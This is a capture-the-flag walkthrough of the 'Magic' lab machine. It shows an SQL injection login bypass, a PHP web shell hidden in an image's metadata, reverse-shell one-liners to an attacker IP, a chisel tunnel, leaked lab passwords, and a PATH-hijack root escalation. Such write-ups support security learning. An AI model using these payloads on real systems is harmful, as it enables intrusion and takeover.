# Magic

### Nmap

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
```

### Web Enum

```
http://10.10.10.185/login.php -> login page (sqli)
```

### Exploitation

```bash
# login bypass on http://10.10.10.185/login.php
Username:"' or 1=1;"
Password:""

# inject payload to jpg and upload to the server
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' rcx.jpg
mv rcx.jpg rcx.php.jpg

# find where the image store and run commands
http://10.10.10.185/images/uploads/rcx.php.jpg?cmd=id

# get shell
http://10.10.10.185/images/uploads/rcx.php.jpg?cmd=bash -c "bash -i >%26 %2fdev%2ftcp%2f10.10.14.29%2f443 0>%261"
```

### Priv Esc

```bash
# found db cred on /var/www/Magic/db.php5
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';

# port forwarding (kali--server)
chisel server -p 10000

# port forwarding (victim--client)
chisel client 10.10.14.29:10000 R:3306:127.0.0.1:3306

# connect to db through tunnel
mysql -u theseus -piamkingtheseus -P 3306

# found cted
admin:Th3s3usW4sK1ng

# switch to theseus
su theseus:Th3s3usW4sK1ng

# found suid
-rwsr-x--- 1 root users 22K Oct 21  2019  (Unknown SUID binary)

# ltrace /bin/sysinfo found fdisk is invoked without specifying the full path
popen("fdisk -l", "r")

# craft payload
cat << EOF > fdisk; chmod +x fdisk
#!/bin/bash
sudo bash -c "bash -i >& /dev/tcp/10.10.14.29/443 0>&1"
EOF

# get root shell
sysinfo
```
